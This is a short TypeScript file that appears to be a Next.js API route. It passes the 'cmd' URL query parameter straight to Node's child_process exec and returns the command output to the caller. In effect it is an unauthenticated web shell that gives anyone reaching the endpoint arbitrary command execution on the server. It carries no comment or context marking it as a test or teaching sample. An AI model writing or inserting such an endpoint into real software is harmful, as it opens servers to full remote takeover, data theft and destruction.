import type { NextApiRequest, NextApiResponse } from 'next'

const { exec } = require('node:child_process')

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { query } = req
  const { cmd } = query

  exec(cmd, (_: any, output: any) => {
    res.status(200).json({ cmd, data: output.split('\n') })
  })
}
